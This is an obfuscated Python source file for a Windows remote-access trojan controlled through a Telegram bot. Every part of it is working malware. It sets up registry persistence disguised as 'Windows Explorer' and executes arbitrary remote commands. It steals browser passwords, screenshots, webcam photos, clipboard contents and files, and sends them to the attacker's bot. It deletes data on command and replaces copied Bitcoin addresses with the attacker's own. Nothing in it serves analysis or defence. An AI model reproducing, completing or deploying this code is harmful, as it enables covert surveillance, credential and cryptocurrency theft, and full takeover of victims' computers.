import time #line:1
import requests #line:3
import os #line:4
import sys #line:5
import pyautogui #line:6
import detailes #line:7
import os .path #line:8
import subprocess #line:9
import re #line:10
import platform #line:11
def move ():#line:17
    O00O0O00O0000O0OO =os .environ ['appdata']#line:18
    O0O0OO0OO00O0OO0O =os .environ ['appdata']+"\\"+os .path .basename (sys .argv [0 ])#line:19
    if not os .path .exists (O0O0OO0OO00O0OO0O ):#line:20
        OO0O00OOO000OOOO0 =os .path .join (O00O0O00O0000O0OO ,os .path .basename (sys .argv [0 ]))#line:26
        subprocess .Popen (f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Windows Explorer" /t REG_SZ /d "{O0O0OO0OO00O0OO0O}"',shell =True )#line:27
        OOOOOO00OOOO000O0 =f'timeout 1 & move /y {os.path.basename(sys.argv[0])} {OO0O00OOO000OOOO0} & cd /d {O00O0O00O0000O0OO}\\ & {new_loc}'#line:28
        subprocess .Popen (OOOOOO00OOOO000O0 ,shell =True )#line:29
        sys .exit (0 )#line:30
move ()#line:32
def Pcinfor ():#line:33
    OOO000000O000OOO0 =os .environ ['username']#line:34
    OOOOOOOOO000O00O0 =platform .node ()#line:35
    OOO0O00O0O000000O ='wmic csproduct get uuid'#line:36
    O000OO00O0O00OO00 =subprocess .Popen (OOO0O00O0O000000O ,shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:37
    OOO0OO0OOO0OO00OO =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text=Bot Active: "+OOO000000O000OOO0 +"\n"+"DesktopName: "+OOOOOOOOO000O00O0 )#line:38
def command_checker (OOOO00OOOO000OO00 ):#line:39
    O0O00OOOO0O0O0O00 =os .getenv ('username')#line:40
    OO0OO0OOO00OOO0O0 =subprocess .Popen (OOOO00OOOO000OO00 ,shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:42
    OO0OO0OOO00OOO0O0 =OO0OO0OOO00OOO0O0 .stdout .read ()+OO0OO0OOO00OOO0O0 .stderr .read ()#line:43
    OO0OO0OOO00OOO0O0 =str (OO0OO0OOO00OOO0O0 ,"utf-8")#line:44
    return "Pc Username : "+O0O00OOOO0O0O0O00 +"\n\n"+OO0OO0OOO00OOO0O0 #line:46
def commands (OOOOO0OOO0OO0O0OO ):#line:49
    OO00OO000OOOOO000 =str (os .getenv ('username'))#line:50
    O0OO0OOO0O0O00OOO =str (OOOOO0OOO0OO0O0OO )#line:51
    if OO00OO000OOOOO000 in O0OO0OOO0O0O00OOO or "getall "in O0OO0OOO0O0O00OOO or "active"in O0OO0OOO0O0O00OOO :#line:52
        if "getall "in O0OO0OOO0O0O00OOO :#line:53
            O0OO0OOO0O0O00OOO =O0OO0OOO0O0O00OOO [7 :]#line:54
        elif O0OO0OOO0O0O00OOO =="active":#line:55
            O0OO0OOO0O0O00OOO =O0OO0OOO0O0O00OOO #line:56
        else :#line:57
            O0000OO0000OOOOO0 =len (OO00OO000OOOOO000 )+1 #line:58
            O0OO0OOO0O0O00OOO =O0OO0OOO0O0O00OOO [O0000OO0000OOOOO0 :]#line:59
        if O0OO0OOO0O0O00OOO =="dir":#line:60
            OOOO0OOOOO0OOOOOO =os .path .realpath (sys .argv [0 ])#line:61
            O0OOO0O0OO0O00O0O =command_checker ("dir /b")#line:62
            OO00O0O0OOO00O0O0 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+OOOO0OOOOO0OOOOOO +"\n\n"+O0OOO0O0OO0O00O0O )#line:64
        elif O0OO0OOO0O0O00OOO =="ipconfig":#line:67
            O0OOO0O0OO0O00O0O =command_checker (O0OO0OOO0O0O00OOO )#line:68
            OO00O0O0OOO00O0O0 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+O0OOO0O0OO0O00O0O )#line:70
        elif O0OO0OOO0O0O00OOO =="allpass":#line:72
            import tempfile #line:74
            O00OO0OOOOOO00O00 =tempfile .gettempdir ()#line:75
            try :#line:78
                "https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text=Please Bro Wait Collecting Information Of "#line:81
                import nomo #line:85
                O0O00O00OOOO00O0O =nomo .main ()#line:86
                import telepot #line:87
                OOO00O0OO0O0O00O0 =telepot .Bot (detailes .api_key )#line:88
                OOO00O0OO0O0O00O0 .sendDocument (detailes .Chat_id ,document =open (O00OO0OOOOOO00O00 +'\\BrowserData.txt','rb'))#line:91
                os .remove (O00OO0OOOOOO00O00 +'\\BrowserData.txt')#line:92
            except :#line:93
                OO00OO000OOOOO000 =os .getenv ('username')#line:94
                OO00O0O0OOO00O0O0 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+OO00OO000OOOOO000 +"'s Antivirus is enabled")#line:96
        elif O0OO0OOO0O0O00OOO =="ss":#line:97
            import tempfile #line:98
            OO0O0O0OO00OOOO0O =tempfile .gettempdir ()#line:99
            OO0O00OOO0O0OOO00 =pyautogui .screenshot ()#line:100
            OO0O00OOO0O0OOO00 .save (OO0O0O0OO00OOOO0O +'\\screenshot_1.png')#line:101
            import telepot #line:102
            OOO00O0OO0O0O00O0 =telepot .Bot (detailes .api_key )#line:103
            OO00O0O0OOO00O0O0 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+OO00OO000OOOOO000 )#line:107
            OOO00O0OO0O0O00O0 .sendDocument (detailes .Chat_id ,document =open (OO0O0O0OO00OOOO0O +'\\screenshot_1.png','rb'))#line:109
            OO00OO000OOOOO000 =os .getenv ('username')#line:110
            os .remove (OO0O0O0OO00OOOO0O +'\\screenshot_1.png')#line:111
        elif "cd "in O0OO0OOO0O0O00OOO :#line:112
            OOOO0O0OOO000OO00 =O0OO0OOO0O0O00OOO [3 :]#line:113
            os .chdir (OOOO0O0OOO000OO00 )#line:114
            O00O0OO0OOOO0000O =command_checker ("echo %cd%")#line:115
            O0O00O00OOOO00O0O =command_checker ("dir /b")#line:116
            O0O00O00OOOO00O0O =O00O0OO0OOOO0000O +"\n\n"+O0O00O00OOOO00O0O #line:117
            OO00O0O0OOO00O0O0 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+O0O00O00OOOO00O0O )#line:119
        elif "cd .."==O0OO0OOO0O0O00OOO :#line:120
            os .chdir (O0OO0OOO0O0O00OOO [3 :])#line:121
            O00O0OO0OOOO0000O =command_checker ("echo %cd%")#line:122
            O0O00O00OOOO00O0O =command_checker ("dir /b")#line:123
            OO0OOOOO0O0OO0000 =O00O0OO0OOOO0000O +"\n\n"+O0O00O00OOOO00O0O #line:124
            OO00O0O0OOO00O0O0 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+OO0OOOOO0O0OO0000 )#line:126
        elif "download "in O0OO0OOO0O0O00OOO :#line:128
            try :#line:129
                import telepot #line:130
                OOO00O0OO0O0O00O0 =telepot .Bot (detailes .api_key )#line:131
                O0OO0OOO0O0O00OOO =O0OO0OOO0O0O00OOO [9 :]#line:132
                OO00O0O0OOO00O0O0 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text=Wait sending the file")#line:134
                OOO00O0OO0O0O00O0 .sendDocument (detailes .Chat_id ,document =open (O0OO0OOO0O0O00OOO ,'rb'))#line:135
            except :#line:136
                OO00O0O0OOO00O0O0 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text=File Not Found")#line:138
        elif O0OO0OOO0O0O00OOO =="clip":#line:140
            O0O00O00OOOO00O0O =subprocess .Popen ('powershell -command "Get-Clipboard"',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:141
            O0O00O00OOOO00O0O =O0O00O00OOOO00O0O .stdout .read ()+O0O00O00OOOO00O0O .stderr .read ()#line:142
            O0O00O00OOOO00O0O =str (O0O00O00OOOO00O0O ,"utf-8")#line:143
            OO00O0O0OOO00O0O0 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+O0O00O00OOOO00O0O )#line:145
        elif O0OO0OOO0O0O00OOO =="exit":#line:146
            sys .exit (0 )#line:147
        elif "zip "in O0OO0OOO0O0O00OOO :#line:148
            O0OO0OOO0O0O00OOO =O0OO0OOO0O0O00OOO [3 :]#line:149
            O0OOO000O000O0O0O ="tar.exe -a -cf"+O0OO0OOO0O0O00OOO #line:150
            subprocess .Popen (O0OOO000O000O0O0O ,shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:151
            OOOO0OOOOO0OOOOOO =os .path .realpath (sys .argv [0 ])#line:152
            O0OOO0O0OO0O00O0O =command_checker ("dir /b")#line:153
            OO00O0O0OOO00O0O0 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+OOOO0OOOOO0OOOOOO +"\n\n"+O0OOO0O0OO0O00O0O )#line:155
        elif "delete "in O0OO0OOO0O0O00OOO :#line:156
            if os .path .exists (O0OO0OOO0O0O00OOO [7 :]):#line:157
                if os .path .isdir (O0OO0OOO0O0O00OOO [7 :]):#line:158
                    O0OOO000O000O0O0O =subprocess .Popen ("rmdir /s /q "+O0OO0OOO0O0O00OOO [7 :],shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:160
                    OOOO0OOOOO0OOOOOO =command_checker ("echo %cd%")#line:161
                    time .sleep (1 )#line:162
                    O0OOO0O0OO0O00O0O =command_checker ("dir /b")#line:163
                    OO00O0O0OOO00O0O0 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+OOOO0OOOOO0OOOOOO +"\n\n"+"Folder Deleted Successfully \n"+O0OOO0O0OO0O00O0O )#line:165
                else :#line:166
                    O0OOO000O000O0O0O =subprocess .Popen ("del "+O0OO0OOO0O0O00OOO [7 :],shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:167
                    OOOO0OOOOO0OOOOOO =command_checker ("echo %cd%")#line:168
                    time .sleep (1 )#line:169
                    O0OOO0O0OO0O00O0O =command_checker ("dir /b")#line:170
                    OO00O0O0OOO00O0O0 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+OOOO0OOOOO0OOOOOO +"\n\n"+"File Deleted Successfully \n"+O0OOO0O0OO0O00O0O )#line:171
            else :#line:172
                OOOO0OOOOO0OOOOOO =os .path .realpath (sys .argv [0 ])#line:173
                O0OOO0O0OO0O00O0O =command_checker ("dir /b")#line:174
                OO00O0O0OOO00O0O0 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text=Pc Name: "+OO00OO000OOOOO000 +"\n"+"Cannot Delete")#line:175
        elif O0OO0OOO0O0O00OOO =="active":#line:176
            Pcinfor ()#line:177
        elif O0OO0OOO0O0O00OOO =="webcam":#line:178
            from cv2 import VideoCapture #line:180
            from cv2 import imwrite #line:181
            from cv2 import waitKey #line:182
            O00O000O0000OO0O0 =0 #line:186
            O00OOO00000000O0O =VideoCapture (O00O000O0000OO0O0 )#line:187
            O0O00O00OOOO00O0O ,O0OO0000000OOOOOO =O00OOO00000000O0O .read ()#line:190
            import tempfile #line:194
            OO0O0O0OO00OOOO0O =tempfile .gettempdir ()#line:195
            if O0O00O00OOOO00O0O :#line:196
                imwrite (OO0O0O0OO00OOOO0O +"\\webpic.png",O0OO0000000OOOOOO )#line:203
                waitKey (0 )#line:207
                import telepot #line:208
                OOO00O0OO0O0O00O0 =telepot .Bot (detailes .api_key )#line:209
                OO00O0O0OOO00O0O0 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+OO00OO000OOOOO000 )#line:213
                OOO00O0OO0O0O00O0 .sendDocument (detailes .Chat_id ,document =open (OO0O0O0OO00OOOO0O +'\\webpic.png','rb'))#line:215
                os .remove (OO0O0O0OO00OOOO0O +'\\webpic.png')#line:216
            else :#line:220
                print ("No image detected. Please! try again")#line:221
        else :#line:222
            O0O00O00OOOO00O0O =subprocess .Popen (O0OO0OOO0O0O00OOO ,shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:223
            O0O00O00OOOO00O0O =O0O00O00OOOO00O0O .stdout .read ()+O0O00O00OOOO00O0O .stderr .read ()#line:224
            O0O00O00OOOO00O0O =str (O0O00O00OOOO00O0O ,"utf-8")#line:225
            OO00O0O0OOO00O0O0 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+O0O00O00OOOO00O0O )#line:227
def btcs ():#line:228
    from hashlib import sha256 #line:229
    import subprocess #line:230
    import detailes #line:231
    O000O0OO0OO0O0OOO ='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'#line:232
    OO00000OOOOO0OOOO =str (os .getenv ('username'))#line:233
    def O00O00O0O000O000O (O0OO00O00O00OOO00 ,O000OOO0O0000OOOO ):#line:234
        OO0OO0O0O0OOO0OO0 =0 #line:235
        for OO0OO0O00O0OO0O00 in O0OO00O00O00OOO00 :#line:236
            OO0OO0O0O0OOO0OO0 =OO0OO0O0O0OOO0OO0 *58 +O000O0OO0OO0O0OOO .index (OO0OO0O00O0OO0O00 )#line:237
        return OO0OO0O0O0OOO0OO0 .to_bytes (O000OOO0O0000OOOO ,'big')#line:238
    def O00000000OOOO0O00 (O0OOO0O00O000OO00 ):#line:241
        try :#line:242
            O000O0O00O000000O =O00O00O0O000O000O (O0OOO0O00O000OO00 ,25 )#line:243
            return O000O0O00O000000O [-4 :]==sha256 (sha256 (O000O0O00O000000O [:-4 ]).digest ()).digest ()[:4 ]#line:244
        except Exception :#line:245
            return False #line:246
    O0O0OO00O00O00O00 =subprocess .Popen ('powershell -command "Get-Clipboard"',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:249
    O0O0OO00O00O00O00 =O0O0OO00O00O00O00 .stdout .read ()+O0O0OO00O00O00O00 .stderr .read ()#line:250
    O0O0OO00O00O00O00 =str (O0O0OO00O00O00O00 .strip (),"utf-8")#line:251
    if '#'in O0O0OO00O00O00O00 or '('in O0O0OO00O00O00O00 or ')'in O0O0OO00O00O00O00 or '{'in O0O0OO00O00O00O00 or '}'in O0O0OO00O00O00O00 or '['in O0O0OO00O00O00O00 or ']'in O0O0OO00O00O00O00 or '"'in O0O0OO00O00O00O00 or "'"in O0O0OO00O00O00O00 :#line:252
        O0O0OO00O00O00O00 ='1'#line:253
    else :#line:254
        OOO000O0000OOO000 =O00000000OOOO0O00 (O0O0OO00O00O00O00 )#line:255
        if OOO000O0000OOO000 ==True :#line:256
            OO000OOO00OOOOO00 ='echo '+detailes .bitcoin +'| clip'#line:257
            subprocess .Popen (OO000OOO00OOOOO00 ,shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:258
            OOO0O0O0O00OO0000 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text=Bit Coin Addreas Changed\nFrom: "+O0O0OO00O00O00O00 +"\nTo: "+detailes .bitcoin +"\nDesktopName: "+OO00000OOOOO0OOOO )#line:259
        else :#line:260
            pass #line:261
Pcinfor ()#line:262
import tempfile #line:263
tempDick =tempfile .gettempdir ()#line:264
while True :#line:266
    try :#line:267
        btcs ()#line:268
        idfile_read =None #line:269
        url ="https://api.telegram.org/bot"+detailes .api_key +"/getUpdates?offset=-1"#line:270
        v =requests .get (url ).text #line:271
        massage_id =re .search ('"message_id":(.*),"from"',v )#line:274
        massage_id_ =massage_id .group (1 )#line:275
        if "/"in v or "zip "in v or " download "in v or ".py"in v or ".zip"in v :#line:277
            text =re .search ('"text":"(.*)","e',v )#line:278
            text_ =text .group (1 )#line:279
        else :#line:281
            text =re .search ('"text":"(.*)"}}]}',v )#line:282
            text_ =text .group (1 )#line:283
        try :#line:285
            idfile =open (tempDick +"\\id.txt","r")#line:286
            idfile_read =idfile .read ()#line:287
            idfile .close ()#line:288
        except :#line:289
            pass #line:290
        if massage_id_ ==idfile_read :#line:291
            pass #line:292
        elif idfile_read ==None :#line:293
            pass #line:294
        else :#line:295
            commands (text_ )#line:297
        idfile =open (tempDick +"\\id.txt","w")#line:298
        idfile .write (massage_id_ )#line:299
        idfile .close ()#line:300
    except Exception as e :#line:301
        print (e )#line:302
        time .sleep (2 )#line:303
